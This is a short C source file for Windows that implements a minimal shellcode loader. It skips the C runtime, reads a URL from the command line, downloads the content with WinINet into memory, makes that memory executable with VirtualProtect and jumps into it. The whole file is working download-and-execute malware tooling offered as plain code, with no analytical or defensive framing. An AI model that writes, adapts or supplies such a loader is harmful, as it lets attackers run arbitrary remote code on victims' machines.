#include <windows.h>
#include <wininet.h>

// Function pointer type for shellcode execution
typedef void (*ShellcodeFunc)(void);

// Minimal shellcode loader using only Windows API
BOOL DownloadAndExecuteShellcode(LPCWSTR url) {
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    LPVOID shellcodeBuffer = NULL;
    DWORD bytesRead = 0;
    DWORD totalSize = 0;
    DWORD bufferSize = 4096; // Initial buffer size
    BOOL success = FALSE;
    
    // Initialize WinINet
    hInternet = InternetOpenW(L"ShellcodeLoader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    // Open URL
    hUrl = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) goto cleanup;
    
    // Allocate initial buffer
    shellcodeBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcodeBuffer) goto cleanup;
    
    // Download shellcode
    while (TRUE) {
        DWORD currentRead = 0;
        
        // Ensure buffer is large enough
        if (totalSize + 1024 > bufferSize) {
            bufferSize *= 2;
            LPVOID newBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!newBuffer) goto cleanup;
            
            // Copy existing data
            if (totalSize > 0) {
                CopyMemory(newBuffer, shellcodeBuffer, totalSize);
            }
            
            VirtualFree(shellcodeBuffer, 0, MEM_RELEASE);
            shellcodeBuffer = newBuffer;
        }
        
        if (!InternetReadFile(hUrl, (LPBYTE)shellcodeBuffer + totalSize, 1024, &currentRead)) {
            goto cleanup;
        }
        
        if (currentRead == 0) break; // End of file
        totalSize += currentRead;
    }
    
    if (totalSize == 0) goto cleanup;
    
    // Change memory protection to executable
    DWORD oldProtect;
    if (!VirtualProtect(shellcodeBuffer, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        goto cleanup;
    }
    
    // Execute shellcode
    ShellcodeFunc execShellcode = (ShellcodeFunc)shellcodeBuffer;
    execShellcode();
    
    success = TRUE;
    
cleanup:
    if (shellcodeBuffer) VirtualFree(shellcodeBuffer, 0, MEM_RELEASE);
    if (hUrl) InternetCloseHandle(hUrl);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return success;
}

// Entry point - no main() to avoid CRT
void WinMainCRTStartup(void) {
    // Get command line
    LPWSTR cmdLine = GetCommandLineW();
    
    // Skip program name to get URL
    LPWSTR url = cmdLine;
    
    // Skip past the executable name (handle quoted and unquoted)
    if (*url == L'"') {
        url++;
        while (*url && *url != L'"') url++;
        if (*url == L'"') url++;
    } else {
        while (*url && *url != L' ') url++;
    }
    
    // Skip whitespace
    while (*url == L' ') url++;
    
    if (*url) {
        DownloadAndExecuteShellcode(url);
    }
    
    ExitProcess(0);
}